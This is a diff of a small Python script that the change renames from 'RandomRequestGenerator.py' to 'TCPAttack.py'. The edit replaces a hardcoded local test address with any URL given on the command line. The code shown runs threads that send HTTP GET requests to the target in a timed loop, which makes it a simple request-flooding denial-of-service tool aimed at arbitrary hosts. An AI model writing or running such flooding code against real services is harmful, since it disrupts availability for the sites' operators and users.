@@ -11,22 +11,22 @@ system = platform.uname()[0]
 End = '\033[0m'
 help_command = """
 Random Request Generator:
-          ./RandomRequestGenerator.py <Time (s)> <threadCount>
+          ./TCPAttack.py <URL> <Time (s)> <threadCount>
           --help
 """
 
 def main():
     if argv[1] == argv[1]:
         try:
-            time_input = int(argv[1])
-            thread_count = int(argv[2])
+            url_request = argv[1]
+            time_input = int(argv[2])
+            thread_count = int(argv[3])
             t_end = time.time() + time_input
             time.sleep(0.35)
             print("\nUsage: Ctrl + C To Exit!!!\n")
             def run(h):
                 while time.time() < t_end:
                     try:
-                        url_request = "http://192.168.29.128:3001/"
                         start_time = time.perf_counter()
                         response = requests.get(url_request, timeout=2.50)
                         print(f"\nPacket send to {url_request}, response time: {(time.perf_counter()-start_time)*1000} ms")
